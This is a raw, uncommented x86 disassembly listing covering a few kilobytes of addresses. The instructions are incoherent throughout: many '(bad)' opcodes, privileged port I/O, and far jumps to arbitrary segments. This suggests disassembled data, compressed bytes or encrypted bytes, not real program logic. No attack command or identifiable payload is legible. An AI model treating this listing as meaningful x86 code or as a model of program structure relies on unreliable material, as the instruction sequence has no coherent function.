  42323a:	cmp    DWORD PTR [edx+0x665c8b63],ebp
  423240:	inc    eax
  423241:	out    dx,al
  423242:	stc    
  423243:	push   eax
  423244:	ins    BYTE PTR es:[edi],dx
  423245:	and    edx,ecx
  423247:	xchg   ch,ah
  423249:	pushf  
  42324a:	mov    bh,0x18
  42324c:	data16 ins BYTE PTR es:[edi],dx
  42324e:	push   ebp
  42324f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423250:	test   ebx,ebp
  423252:	adc    eax,DWORD PTR fs:[ecx]
  423255:	or     ebp,DWORD PTR [edi-0x639ff75d]
  42325b:	push   edx
  42325c:	push   0x2af44995
  423261:	lods   al,BYTE PTR ds:[esi]
  423262:	or     eax,0x998f1f1b
  423267:	out    0xfc,eax
  423269:	bnd je 0x42320e
  42326c:	loop   0x423201
  42326e:	sub    eax,0xf208bf86
  423273:	dec    esi
  423274:	push   0x56
  423276:	ins    DWORD PTR es:[edi],dx
  423277:	jp     0x4232d9
  423279:	and    dl,BYTE PTR [ecx-0x27338ad1]
  42327f:	push   0x69f02847
  423284:	pushw  0xf3dd
  423288:	(bad)  
  423289:	aaa    
  42328a:	xor    ebp,DWORD PTR fs:[eax-0x199a861f]
  423291:	out    dx,al
  423292:	in     al,dx
  423293:	push   0x3b
  423295:	shr    ah,0x81
  423298:	sbb    bl,BYTE PTR [ebp+0x299b8de7]
  42329e:	or     al,0x52
  4232a0:	and    DWORD PTR [ebx-0x36],0xf8c83ed2
  4232a7:	jl     0x42329f
  4232a9:	sbb    ecx,esi
  4232ab:	cli    
  4232ac:	dec    ecx
  4232ad:	push   ss
  4232ae:	mov    ebp,0x851735a6
  4232b3:	hlt    
  4232b4:	sti    
  4232b5:	xlat   BYTE PTR ds:[ebx]
  4232b6:	mov    eax,ds:0x41e8849
  4232bb:	inc    esp
  4232bc:	mov    ecx,0x15956555
  4232c1:	mov    BYTE PTR [eax+0x9207bf8],al
  4232c7:	push   0x9a6f3f51
  4232cc:	fsubr  QWORD PTR [edi-0xb]
  4232cf:	xor    edi,DWORD PTR [ecx-0x61c71038]
  4232d5:	xchg   ebp,eax
  4232d6:	jle    0x4232e4
  4232d8:	mov    ds:0xb47af604,al
  4232dd:	shl    BYTE PTR [ecx+0x87c6c5a],1
  4232e3:	inc    edi
  4232e4:	das    
  4232e5:	add    eax,0xdeb3fe5a
  4232ea:	pop    esp
  4232eb:	outs   dx,BYTE PTR ds:[esi]
  4232ec:	mov    ebx,fs
  4232ee:	sub    al,0xe4
  4232f0:	pop    ebp
  4232f1:	jge    0x423337
  4232f3:	nop
  4232f4:	(bad)  
  4232f5:	sub    edi,DWORD PTR [ecx-0x15]
  4232f8:	mov    BYTE PTR [edx+ecx*4-0x5b],ch
  4232fc:	ins    BYTE PTR es:[edi],dx
  4232fd:	xor    BYTE PTR ds:0xac9ee087,ch
  423303:	aas    
  423304:	xchg   ebp,eax
  423305:	outs   dx,DWORD PTR ds:[esi]
  423306:	jmp    0x630355a9
  42330b:	idiv   DWORD PTR cs:[ebp-0x37b5c3b9]
  423312:	inc    esp
  423313:	mov    ebp,0x70f111db
  423318:	push   ebp
  423319:	mov    DWORD PTR [eax+0x7748b394],edi
  42331f:	jne    0x423386
  423321:	push   esp
  423322:	loop   0x42338c
  423324:	push   ds
  423325:	sub    DWORD PTR [esi-0x74d23878],esi
  42332b:	lods   eax,DWORD PTR ds:[esi]
  42332c:	jnp    0x42339f
  42332e:	mov    bh,BYTE PTR [edi+0x2a]
  423331:	push   ebp
  423332:	xor    eax,0x1a80d61d
  423337:	xor    ebp,ebx
  423339:	hlt    
  42333a:	cmc    
  42333b:	add    dh,cl
  42333d:	icebp  
  42333e:	popf   
  42333f:	rol    DWORD PTR [edx-0x7ec7e975],cl
  423345:	pop    es
  423346:	enter  0x6d1b,0xb0
  42334a:	pop    esp
  42334b:	fsubr  QWORD PTR [esi]
  42334d:	inc    ecx
  42334e:	dec    esp
  42334f:	inc    esp
  423350:	or     BYTE PTR [ecx+0x59],0x9a
  423354:	call   0xa473:0xff7c9ca2
  42335b:	loopne 0x4233d5
  42335d:	inc    ebp
  42335e:	xchg   ebp,eax
  42335f:	stc    
  423360:	push   ss
  423361:	mul    bl
  423363:	test   eax,0xdae3da9f
  423368:	or     DWORD PTR [ecx+0x4b1c3abd],edx
  42336e:	std    
  42336f:	mov    gs,WORD PTR [ecx-0x4a]
  423372:	push   ebx
  423373:	fxch   st(1)
  423375:	retf   0xc111
  423378:	jp     0x4233c5
  42337a:	xchg   esi,eax
  42337b:	pop    edx
  42337c:	in     al,0xd5
  42337e:	fucomi st,st(0)
  423380:	xchg   ebx,eax
  423381:	outs   dx,BYTE PTR ds:[esi]
  423382:	inc    ebx
  423383:	test   BYTE PTR [esi],dl
  423385:	xlat   BYTE PTR ds:[ebx]
  423386:	scas   eax,DWORD PTR es:[edi]
  423387:	sbb    eax,0x952f890c
  42338c:	sbb    DWORD PTR [eax-0x42],edx
  42338f:	repnz pop ebp
  423391:	pop    es
  423392:	lods   al,BYTE PTR ds:[esi]
  423393:	dec    esi
  423394:	fild   WORD PTR [ebx-0x3a]
  423397:	in     al,0xad
  423399:	adc    BYTE PTR [edi+ecx*8-0x4fc4672],bl
  4233a0:	cmp    BYTE PTR [esi-0x56],cl
  4233a3:	popw   ss
  4233a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233a6:	dec    ebp
  4233a7:	jmp    0x1dbf:0x52cca1e3
  4233ae:	jle    0x4233cd
  4233b0:	es out dx,eax
  4233b2:	and    BYTE PTR [ebx-0x690999bd],ah
  4233b8:	inc    ebx
  4233b9:	push   ss
  4233ba:	xchg   ebx,eax
  4233bb:	pop    ds
  4233bc:	nop
  4233bd:	(bad)  
  4233be:	aad    0x5c
  4233c0:	and    ebp,DWORD PTR [esi+0x7adeeba1]
  4233c6:	call   0x1113c473
  4233cb:	sub    dl,BYTE PTR [eax]
  4233cd:	jo     0x42340a
  4233cf:	cmp    al,bl
  4233d1:	cmp    DWORD PTR [eax],esi
  4233d3:	jle    0x42341e
  4233d5:	in     al,0x69
  4233d7:	lahf   
  4233d8:	mov    ecx,0xc7ce2d8e
  4233dd:	and    BYTE PTR [ecx],al
  4233df:	mov    edx,DWORD PTR [edi]
  4233e1:	pop    ecx
  4233e2:	cmc    
  4233e3:	jecxz  0x423454
  4233e5:	iret   
  4233e6:	fcomi  st,st(0)
  4233e8:	mov    ds:0x18e1a19c,al
  4233ed:	shr    DWORD PTR [edx+eax*2-0x2c],1
  4233f1:	rcl    BYTE PTR [edx-0x3d948e6b],0x89
  4233f8:	mov    BYTE PTR [ebx+0x581e60f2],dl
  4233fe:	jmp    0x4233ea
  423400:	sar    DWORD PTR ds:0xf3a31d27,0x95
  423407:	aaa    
  423408:	mov    cl,0x87
  42340a:	adc    eax,0xecb5729f
  42340f:	mov    BYTE PTR [ebp+0x29f38759],cl
  423415:	lfs    ecx,FWORD PTR [edx+eax*1]
  423419:	rcl    BYTE PTR [ebp+0x37],cl
  42341c:	stos   DWORD PTR es:[edi],eax
  42341d:	bound  ebp,QWORD PTR [esi]
  42341f:	mov    dh,0x67
  423421:	rol    DWORD PTR [eax+0x14],1
  423424:	dec    ebx
  423425:	shl    DWORD PTR [ecx],cl
  423427:	(bad)  
  423428:	in     al,0x20
  42342a:	cmp    al,0xf2
  42342c:	test   al,0x10
  42342e:	ins    BYTE PTR es:[edi],dx
  42342f:	inc    ecx
  423430:	mov    bh,0x73
  423432:	clc    
  423433:	ret    0xd328
  423436:	out    dx,eax
  423437:	jae    0x423408
  423439:	inc    ecx
  42343a:	sti    
  42343b:	outs   dx,BYTE PTR ds:[esi]
  42343c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42343d:	aas    
  42343e:	mov    bh,0xf3
  423440:	inc    ebp
  423441:	add    dh,dh
  423443:	or     dh,BYTE PTR [edi-0x35]
  423446:	inc    ecx
  423447:	mov    cl,BYTE PTR [ebx+0x64e9956b]
  42344d:	les    ecx,FWORD PTR [esp+edi*2+0x58cbfc93]
  423454:	fsub   st(2),st
  423456:	cmp    BYTE PTR [edx-0x3a8d02ed],dh
  42345c:	jno    0x423433
  42345e:	add    ch,cl
  423460:	sbb    ebp,DWORD PTR [eax]
  423462:	adc    BYTE PTR [ebx],dh
  423464:	cwde   
  423465:	mov    al,ds:0xbb842f20
  42346a:	repnz adc al,0x49
  42346d:	and    al,0x45
  42346f:	out    dx,al
  423470:	pop    esp
  423471:	push   eax
  423472:	leave  
  423473:	xor    BYTE PTR [edx+esi*2],0xd3
  423477:	test   BYTE PTR [ecx+0x793c680c],dl
  42347d:	dec    esp
  42347e:	mov    cl,0xbe
  423480:	adc    BYTE PTR [edx],ah
  423482:	int    0xb0
  423484:	or     esi,edx
  423486:	(bad)  
  423488:	loope  0x423488
  42348a:	int3   
  42348b:	sti    
  42348c:	cs retf 0xcd9d
  423490:	enter  0xab4e,0xdd
  423494:	out    0x6e,al
  423496:	sbb    eax,DWORD PTR [eax]
	...
  423514:	shr    ah,cl
  423516:	and    edx,DWORD PTR [ecx]
  423518:	aas    
  423519:	fcomip st,st(2)
  42351b:	out    dx,eax
  42351c:	or     DWORD PTR [esi+0x5ddeeacd],ebp
  423522:	cmp    edx,DWORD PTR [ecx+edi*1-0x36]
  423526:	add    DWORD PTR [eax],eax
  423528:	imul   eax,DWORD PTR [edi],0x0
  42352b:	add    BYTE PTR [eax+0x7441475f],ah
  423531:	into   
  423532:	iret   
  423533:	inc    edi
  423534:	dec    eax
  423535:	cwde   
  423536:	in     eax,dx
  423537:	into   
  423538:	push   ebx
  423539:	(bad)  
  42353a:	loope  0x4234e5
  42353c:	add    DWORD PTR ds:0x34072220,esi
  423542:	and    DWORD PTR [edi+0x797932ed],edi
  423548:	jg     0x423517
  42354a:	sub    DWORD PTR [edx],ecx
  42354c:	mov    ecx,0x66413bd1
  423551:	leave  
  423552:	push   ebx
  423553:	or     bh,BYTE PTR [esp+esi*8-0x79064813]
  42355a:	imul   ebx,DWORD PTR [esi+ecx*1+0x50e6d923],0xffffffbb
  423562:	hlt    
  423563:	and    eax,0x7c003d05
  423568:	idiv   BYTE PTR [esi-0x277b704a]
  42356e:	div    BYTE PTR [edi+0x18]
  423571:	dec    edi
  423572:	test   al,0x5d
  423574:	ins    BYTE PTR es:[edi],dx
  423575:	pop    ebp
  423576:	(bad)  
  423577:	out    dx,al
  423578:	or     al,0x59
  42357a:	cmc    
  42357b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42357c:	pusha  
  42357d:	push   ds
  42357e:	les    edx,FWORD PTR [ecx-0x22]
  423581:	jecxz  0x423597
  423583:	xchg   edx,eax
  423584:	or     BYTE PTR [ecx-0x1db0fb2],bl
  42358a:	push   0x855d6c73
  42358f:	mov    al,BYTE PTR [esi+0x20140ab3]
  423595:	(bad)  
  423596:	(bad)  
  423597:	adc    dl,BYTE PTR [edi-0x379f679f]
  42359d:	neg    DWORD PTR [ebx+0x17d08faa]
  4235a3:	mov    eax,ds:0x82c2b8d3
  4235a8:	mov    esp,0x32cbcf3
  4235ad:	mov    ebp,esp
  4235af:	ret    
  4235b0:	test   al,0x64
  4235b2:	add    al,BYTE PTR [ebp-0x661cebbb]
  4235b8:	hlt    
  4235b9:	call   0x15ffe1fd
  4235be:	jo     0x4235d5
  4235c0:	adc    ah,BYTE PTR [ebx*2+0x197af9bc]
  4235c7:	or     DWORD PTR [edi+eiz*4-0x26],ebx
  4235cb:	add    bl,ah
  4235cd:	ficomp WORD PTR [ebp+0x32]
  4235d0:	jl     0x42357b
  4235d2:	cwde   
  4235d3:	in     al,dx
  4235d4:	mov    DWORD PTR [eax+0x17],edi
  4235d7:	div    BYTE PTR [edx]
  4235d9:	loope  0x423612
  4235db:	jmp    0x42357b
  4235dd:	pop    ebx
  4235de:	xlat   BYTE PTR ds:[ebx]
  4235df:	lea    esi,[edi-0x70bd154b]
  4235e5:	rol    DWORD PTR [bp-0xe8a],0x84
  4235eb:	rcl    BYTE PTR [edx-0x44],1
  4235ee:	stc    
  4235ef:	push   es
  4235f0:	push   ebp
  4235f1:	jns    0x4235fe
  4235f3:	add    al,0x9c
  4235f5:	lds    edx,FWORD PTR [ebp-0x56985565]
  4235fb:	xor    ebp,edx
  4235fd:	push   esi
  4235fe:	aad    0x81
  423600:	or     al,0x85
  423602:	in     eax,0x91
  423604:	mov    ds:0x68fb053d,eax
  423609:	push   0x387d400a
  42360e:	repz xor BYTE PTR [eax+eax*8],bl
  423612:	sbb    bl,BYTE PTR [edi]
  423614:	dec    edx
  423615:	aad    0xc1
  423617:	fwait
  423618:	call   0xbe28:0xa38ff0
  42361f:	push   ebx
  423620:	adc    al,0x64
  423622:	push   0xcf5fc23a
  423627:	push   cs
  423628:	xchg   BYTE PTR [ebx-0x31c268a3],dl
  42362e:	pop    ds
  42362f:	lods   eax,DWORD PTR ds:[esi]
  423630:	pop    edi
  423631:	cld    
  423632:	pop    es
  423633:	imul   ebp,DWORD PTR [bx+di+0x3bb0],0xd3eb26f4
  42363c:	jg     0x423626
  42363e:	sub    al,0xff
  423640:	xchg   esp,eax
  423641:	repnz fistp DWORD PTR [esi-0x3570deb6]
  423648:	dec    ebp
  423649:	xchg   ebx,esp
  42364b:	adc    BYTE PTR [esi],0x43
  42364e:	mov    ch,BYTE PTR [eax]
  423650:	call   0xf75f:0xb56eddb
  423657:	sbb    bh,BYTE PTR [edi+0x1d]
  42365a:	(bad)  
  42365b:	das    
  42365c:	or     edi,0xbdad70c0
  423662:	(bad)  
  423663:	out    dx,al
  423664:	mov    BYTE PTR [eax+0x157b074],ch
  42366a:	iret   
  42366b:	jp     0x423659
  42366d:	(bad)  
  42366e:	sub    al,0x17
  423670:	push   edi
  423671:	jbe    0x42360e
  423673:	fisubr DWORD PTR [ebx+0x55ec5547]
  423679:	jmp    0x35d1:0xea4d10d8
  423680:	mov    ecx,0xc7357d0
  423685:	sti    
  423686:	sbb    DWORD PTR [edi+ebp*8-0x1cd04cda],ebp
  42368d:	call   0x94a0330
  423692:	sbb    BYTE PTR [ecx-0xe],al
  423695:	repnz seto BYTE PTR [ecx+0x4c]
  42369a:	aas    
  42369b:	ins    DWORD PTR es:[edi],dx
  42369c:	cmp    dl,BYTE PTR [edi-0x2c971d63]
  4236a2:	sub    DWORD PTR [edi+0xd1be8e4],0xb81dc9e
  4236ac:	or     esp,DWORD PTR [edx+0x567e5fbd]
  4236b2:	sbb    ch,BYTE PTR [edi+0x4e]
  4236b5:	add    al,cl
  4236b7:	nop
  4236b8:	sbb    al,0x41
  4236ba:	pop    edx
  4236bb:	jnp    0x423720
  4236bd:	popf   
  4236be:	mul    DWORD PTR [ecx+0x2fc7fbcf]
  4236c4:	jmp    0x19f7076
  4236c9:	sbb    al,0xbc
  4236cb:	sub    edx,esp
  4236cd:	aaa    
  4236ce:	loope  0x42371c
  4236d0:	sbb    esp,DWORD PTR [edi+0xd75614c]
  4236d6:	mov    eax,ds:0xbc5474f7
  4236db:	lods   eax,DWORD PTR ds:[esi]
  4236dc:	retf   0xefcd
  4236df:	cmp    al,0xc
  4236e1:	rcl    BYTE PTR [edi-0x1daab3fd],0xc
  4236e8:	xor    cl,BYTE PTR [ebp-0x16]
  4236eb:	mov    dl,0xeb
  4236ed:	dec    esp
  4236ee:	adc    ebp,0x53f7392e
  4236f4:	sbb    eax,0x27dc89d6
  4236f9:	xchg   edi,eax
  4236fa:	je     0x423682
  4236fc:	out    0xc,eax
  4236fe:	ds jle 0x42370b
  423701:	icebp  
  423702:	jno    0x423766
  423704:	jecxz  0x4236a3
  423706:	(bad)  
  423708:	test   DWORD PTR [ecx],esp
  42370a:	jmp    FWORD PTR [ecx]
  42370c:	into   
  42370d:	adc    DWORD PTR [ecx+edx*4-0x46],ecx
  423711:	or     DWORD PTR gs:[edx+0x41],esp
  423715:	pop    ds
  423716:	xchg   ebp,eax
  423717:	mov    ch,0xe9
  423719:	mov    esi,DWORD PTR [eax-0x1cbfa668]
  42371f:	arpl   WORD PTR ds:0xb33eb659,si
  423725:	dec    edx
  423726:	jecxz  0x423785
  423728:	push   ecx
  423729:	out    dx,al
  42372a:	cmp    DWORD PTR [eax+0x79882309],0x10
  423731:	pop    ss
  423732:	int3   
  423733:	and    cl,BYTE PTR [ecx-0x26]
  423736:	mov    bl,0x3c
  423738:	jae    0x42373f
  42373a:	pop    ebx
  42373b:	mov    cl,0x9e
  42373d:	div    DWORD PTR [eax-0x7f]
  423740:	jae    0x4236f0
  423742:	cmp    BYTE PTR [eax],dh
  423744:	dec    ebp
  423745:	inc    esi
  423746:	xchg   esp,eax
  423747:	xor    edx,DWORD PTR [ecx-0x6b]
  42374a:	xor    bh,cl
  42374c:	push   edi
  42374d:	sbb    BYTE PTR ds:0xf41bf4c0,dl
  423753:	pop    esi
  423754:	pop    ss
  423755:	ret    0x493c
  423758:	outs   dx,BYTE PTR ds:[esi]
  423759:	les    eax,FWORD PTR [edx+0xde55c51]
  42375f:	inc    edi
  423760:	ins    DWORD PTR es:[edi],dx
  423761:	sub    DWORD PTR [eax-0x6e],edi
  423764:	pop    ebx
  423765:	fcomp  QWORD PTR [ebx]
  423767:	xchg   BYTE PTR [ecx+edi*8+0x6b9f90c6],bh
  42376e:	imul   ebx,esp,0xffffffb0
  423771:	push   ebx
  423772:	dec    edx
  423773:	call   0xf5c2:0x63c9e024
  42377a:	outs   dx,BYTE PTR ds:[esi]
  42377b:	mov    esp,0x9407e09d
  423780:	sbb    edi,DWORD PTR [edx-0x30]
  423783:	fsub   QWORD PTR [edi-0x37]
  423786:	outs   dx,DWORD PTR ds:[esi]
  423787:	imul   edi,DWORD PTR ds:0xc88276c4,0xec1fe59f
  423791:	leave  
  423792:	xchg   ecx,eax
  423793:	pop    edx
  423794:	movnti DWORD PTR [ebp-0x10f9ac57],esi
  42379b:	lds    eax,FWORD PTR [ecx+0xaa911df]
  4237a1:	adc    BYTE PTR [edx-0x35264299],ch
  4237a7:	bound  esp,QWORD PTR gs:[ecx-0x71]
  4237ab:	push   ebx
  4237ac:	push   ecx
  4237ad:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4237af:	test   al,0x97
  4237b1:	sub    al,0x40
  4237b3:	xor    ah,BYTE PTR [edi]
  4237b5:	cld    
  4237b6:	or     dh,BYTE PTR cs:[esi+eax*2-0x1b43c87d]
  4237be:	xchg   BYTE PTR [ebx+0x1d559303],bl
  4237c4:	cwde   
  4237c5:	mov    ds:0x5c8ff888,al
  4237ca:	sub    DWORD PTR [ecx],edi
  4237cc:	jecxz  0x423764
  4237ce:	(bad)  
  4237cf:	mov    ds:0x7153206,eax
  4237d4:	call   0xc0418a72
  4237d9:	sbb    DWORD PTR [ebp+0x1f],0x6b
  4237dd:	dec    edi
  4237de:	jb     0x4237d0
  4237e0:	in     al,0xbd
  4237e2:	jmp    0x49c1aa07
  4237e7:	dec    edx
  4237e8:	fistp  DWORD PTR ds:[edi-0x7419938e]
  4237ef:	jg     0x4237b0
  4237f1:	jo     0x42384d
  4237f3:	out    0x1a,al
  4237f5:	out    dx,al
  4237f6:	call   0x5545c8db
  4237fb:	shl    DWORD PTR [ecx+edi*8],1
  4237fe:	ss xchg ebp,eax
  423800:	(bad)  
  423801:	(bad)  
  423802:	fistp  DWORD PTR [esi]
  423804:	pop    ss
  423805:	sbb    BYTE PTR [eax],cl
  423807:	sub    BYTE PTR [edx+0x22bc4197],bl
  42380d:	aad    0x12
  42380f:	sar    DWORD PTR [edi],cl
  423811:	and    BYTE PTR [edx+0x1787c3d2],bl
  423817:	xchg   ebp,eax
  423818:	(bad)  [edi+0x31]
  42381b:	into   
  42381c:	imul   edx
  42381e:	mov    edi,0xaaacc132
  423823:	sbb    eax,0xaba70a72
  423828:	pop    esi
  423829:	xchg   esp,eax
  42382a:	cli    
  42382b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42382c:	cdq    
  42382d:	xchg   edx,eax
  42382e:	inc    eax
  42382f:	mov    DWORD PTR [edi+0x48],0xd3b766dd
  423836:	in     eax,0x88
  423838:	jbe    0x423851
  42383a:	jno    0x42384d
  42383c:	pusha  
  42383d:	in     al,dx
  42383e:	aam    0x39
  423840:	icebp  
  423841:	lods   eax,DWORD PTR ds:[esi]
  423842:	fisub  WORD PTR [ecx+0x6f]
  423845:	xchg   DWORD PTR [edx],edi
  423847:	pop    ebx
  423848:	mov    ?,WORD PTR ds:0xcd0836e3
  42384e:	mov    WORD PTR [edx-0x45],cs
  423851:	sbb    al,0xb3
  423853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423854:	aam    0x84
  423856:	inc    ecx
  423857:	pop    ebx
  423858:	and    edi,0xd
  42385b:	xor    eax,0xcedb4a84
  423860:	jbe    0x4237e6
  423862:	ret    0xed4d
  423865:	lahf   
  423866:	icebp  
  423867:	aam    0xc9
  423869:	xchg   esp,eax
  42386a:	ins    DWORD PTR es:[edi],dx
  42386b:	pop    ds
  42386c:	sbb    esp,DWORD PTR [esi]
  42386e:	jmp    0x6781:0xff37f13d
  423875:	scas   al,BYTE PTR es:[edi]
  423876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423877:	mul    DWORD PTR ds:0xfaa2547b
  42387d:	mov    DWORD PTR [esi-0x6b],esi
  423880:	jmp    DWORD PTR [eax+0x69b48914]
  423886:	into   
  423887:	lahf   
  423888:	mov    DWORD PTR [ecx+0x25],ebp
  42388b:	lahf   
  42388c:	aaa    
  42388d:	and    BYTE PTR [ebx-0x1793812e],cl
  423893:	pop    ecx
  423894:	mov    dl,0x2e
  423896:	add    DWORD PTR fs:[ebx+edx*4+0xd],0xffffffbb
  42389c:	and    cl,BYTE PTR [ebx]
  42389e:	pop    ecx
  42389f:	test   eax,0x4aca6264
  4238a4:	push   0x2e1440da
  4238a9:	ins    BYTE PTR es:[edi],dx
  4238aa:	ja     0x423835
  4238ac:	mov    ah,0x9c
  4238ae:	je     0x42386e
  4238b0:	into   
  4238b1:	loope  0x4238b3
  4238b3:	jne    0x423845
  4238b5:	dec    esp
  4238b6:	and    al,BYTE PTR [ebx]
  4238b8:	(bad)  
  4238ba:	pop    ebp
  4238bb:	xlat   BYTE PTR ds:[ebx]
  4238bc:	rcl    BYTE PTR [ebx],0xbd
  4238bf:	(bad)  
  4238c0:	mov    ch,0x15
  4238c2:	sbb    ch,BYTE PTR fs:[edi]
  4238c5:	outs   dx,DWORD PTR ds:[esi]
  4238c6:	lods   al,BYTE PTR ds:[esi]
  4238c7:	cmp    ch,BYTE PTR [edx+0x31]
  4238ca:	cdq    
  4238cb:	stc    
  4238cc:	enter  0x54c7,0xd5
  4238d0:	test   bh,bl
  4238d2:	add    edi,DWORD PTR [ebp+0x2]
  4238d5:	cmc    
  4238d6:	ins    DWORD PTR es:[edi],dx
  4238d7:	push   es
  4238d8:	xchg   esi,eax
  4238d9:	xchg   DWORD PTR [esi-0x76118211],ebx
  4238df:	shl    esi,0x1f
  4238e2:	stos   DWORD PTR es:[edi],eax
  4238e3:	mov    BYTE PTR ds:0x35a0d164,dl
  4238e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238ea:	sub    DWORD PTR [eax-0x3c],0xffffff9a
  4238ee:	adc    DWORD PTR [edi-0x5a95184e],0xc4a0d86
  4238f8:	push   esp
  4238f9:	shl    DWORD PTR [edx],cl
  4238fb:	es xchg ecx,eax
  4238fd:	mov    edx,0xce42d619
  423902:	ss ins BYTE PTR es:[edi],dx
  423904:	push   eax
  423905:	or     al,0xd
  423907:	daa    
  423908:	ss (bad) 
  42390a:	in     eax,0xd8
  42390c:	xchg   ebp,eax
  42390d:	pushf  
  42390e:	out    0x71,al
  423910:	jecxz  0x4238c5
  423912:	popa   
  423913:	mov    ecx,0x236c3cb9
  423918:	sahf   
  423919:	xchg   edx,eax
  42391a:	inc    eax
  42391b:	imul   DWORD PTR [ecx]
  42391d:	gs (bad) 
  42391f:	cmp    eax,0xfb207233
  423924:	and    eax,0xfdce9374
  423929:	mov    eax,ds:0xc17c5ed0
  42392e:	test   BYTE PTR [ebx+0x5f],ch
  423931:	xchg   esp,eax
  423932:	arpl   WORD PTR [eax+0x70c65db4],di
  423938:	rcr    ebp,0xb0
  42393b:	adc    DWORD PTR [ecx-0x6ad43185],ebx
  423941:	mov    DWORD PTR [edi+esi*1],0xc60adfd1
  423948:	jo     0x4238ee
  42394a:	(bad)  
  42394b:	imul   eax,DWORD PTR [eax+0xd70433f],0xc6371a3b
  423955:	xor    eax,0x25dbb1db
  42395a:	jge    0x423956
  42395c:	stc    
  42395d:	sti    
  42395e:	fdiv   QWORD PTR gs:[ecx]
  423961:	enter  0xa778,0xbb
  423965:	push   esp
  423966:	mov    dh,0x6b
  423968:	(bad)  
  423969:	mov    ch,ch
  42396b:	aad    0x76
  42396d:	aas    
  42396e:	cs push ds
  423970:	inc    ecx
  423971:	cld    
  423972:	sar    BYTE PTR [ebx+0x58b95d88],1
  423978:	mov    ecx,DWORD PTR [edi+0x22]
  42397b:	in     al,dx
  42397c:	push   esp
  42397d:	xchg   ebx,eax
  42397e:	jo     0x423923
  423980:	leave  
  423981:	push   esp
  423982:	cs dec esp
  423984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423985:	sub    eax,0x41705a93
  42398a:	sbb    al,0xd2
  42398d:	or     DWORD PTR [ebp-0x7d39d1a7],0xffffffdc
  423994:	xor    al,0x37
  423996:	loop   0x4239c0
  423998:	push   ss
  423999:	bound  esp,QWORD PTR [ebp+esi*4-0x6a]
  42399d:	lods   eax,DWORD PTR ds:[esi]
  42399e:	fnstsw WORD PTR [ebx+0x4a]
  4239a1:	std    
  4239a2:	mov    DWORD PTR [ecx+0x44],esi
  4239a5:	sbb    al,0x62
  4239a7:	or     bl,dh
  4239a9:	call   0xbca30d0d
  4239ae:	xchg   DWORD PTR [ecx],edi
  4239b0:	ror    ebp,1
  4239b2:	jnp    0x423a0e
  4239b4:	mov    ds:0x7c3865b,al
  4239b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239ba:	jmp    0xe9ba:0xb3c67a14
  4239c1:	loopne 0x4239df
  4239c3:	out    dx,eax
  4239c4:	mov    DWORD PTR [esi+edi*2-0x6d],ebx
  4239c8:	mov    ah,0x1a
  4239ca:	lock aaa 
  4239cc:	cmp    eax,0xa796289d
  4239d1:	cmp    eax,0xd76765d4
  4239d6:	enter  0x9ce9,0xce
  4239da:	imul   ebp,eax,0x1d
  4239dd:	scas   eax,DWORD PTR es:[edi]
  4239de:	fnsave [ebp-0x39e47966]
  4239e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239e5:	ins    BYTE PTR es:[edi],dx
  4239e6:	pusha  
  4239e7:	pushf  
  4239e8:	(bad)  [ecx+ebx*2-0x70]
  4239ec:	outs   dx,BYTE PTR ds:[esi]
  4239ed:	test   al,0x30
  4239ef:	add    al,0x2c
  4239f1:	cld    
  4239f2:	sbb    DWORD PTR [edx-0x68],esp
  4239f5:	test   ecx,edi
  4239f7:	mov    edx,0x245eec8f
  4239fc:	xchg   edi,eax
  4239fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239fe:	sbb    DWORD PTR [edi+0x5db58c2f],edx
  423a04:	outs   dx,BYTE PTR ds:[esi]
  423a05:	test   al,0xed
  423a07:	sar    DWORD PTR [ebx-0x48e45c27],1
  423a0d:	xor    bl,BYTE PTR [esi]
  423a0f:	shl    DWORD PTR [esi-0x44d36028],1
  423a15:	rol    DWORD PTR [edx-0x70d3169e],1
  423a1b:	ins    BYTE PTR es:[edi],dx
  423a1c:	cmp    eax,0xc9eeb46c
  423a21:	adc    BYTE PTR [ebx-0x7e11c118],0x61
  423a28:	jnp    0x423a8f
  423a2a:	retf   
  423a2b:	je     0x423a3a
  423a2d:	push   ds
  423a2e:	mov    ds:0x44249acb,eax
  423a33:	ja     0x4239d9
  423a35:	adc    al,BYTE PTR ds:0x664d7744
  423a3b:	add    edi,DWORD PTR [ebp-0x1e]
  423a3e:	aaa    
  423a3f:	and    DWORD PTR [ebx+0x8498807],ebx
  423a45:	sbb    ecx,ebp
  423a47:	ss scas al,BYTE PTR es:[edi]
  423a49:	sub    BYTE PTR [eax],cl
  423a4b:	popf   
  423a4c:	cmp    bl,bh
  423a4e:	and    DWORD PTR [eax+edi*2-0x15f0a922],0x90ef304e
  423a59:	icebp  
  423a5a:	hlt    
  423a5b:	or     al,0xcd
  423a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a5e:	jg     0x4239e5
  423a60:	aaa    
  423a61:	pushf  
  423a62:	ins    DWORD PTR es:[edi],dx
  423a63:	inc    eax
  423a64:	inc    ebx
  423a65:	cdq    
  423a66:	retf   
  423a67:	outs   dx,DWORD PTR ds:[esi]
  423a68:	clc    
  423a69:	neg    bl
  423a6b:	cli    
  423a6c:	repz cdq 
  423a6e:	test   eax,0xb8a32837
  423a73:	push   es
  423a74:	inc    edx
  423a75:	aam    0x24
  423a77:	fs fadd st,st(4)
  423a7a:	and    al,0x8f
  423a7c:	jg     0x423a7c
  423a7e:	mov    ch,0x59
  423a80:	pop    ss
  423a81:	sahf   
  423a82:	lock fmul QWORD PTR [esp+edx*4-0x3ae0521a]
  423a8a:	push   ss
  423a8b:	call   0xe15:0xca78699c
  423a92:	dec    edi
  423a93:	pop    ecx
  423a94:	push   0xffffffd1
  423a96:	sbb    DWORD PTR [esi+0x20],esi
  423a99:	int    0x1f
  423a9b:	popa   
  423a9c:	inc    edx
  423a9d:	stc    
  423a9e:	ror    DWORD PTR es:[ebp+0x49],cl
